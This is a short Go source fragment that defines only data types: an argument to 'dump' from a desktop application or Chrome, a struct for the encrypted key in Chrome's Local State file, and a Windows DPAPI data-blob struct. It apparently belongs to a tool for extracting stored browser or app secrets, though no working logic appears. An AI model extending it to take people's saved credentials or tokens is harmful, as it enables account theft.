package main

type Args struct {
	Source int `arg:"-s" default:"1" help:"Where to dump from. 1 = Desktop, 2 = Chrome, 3 = All (desktop first, then Chrome)."`
}

type LocalState struct {
	OSCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

type DataBlob struct {
	cbData uint32
	pbData *byte
}
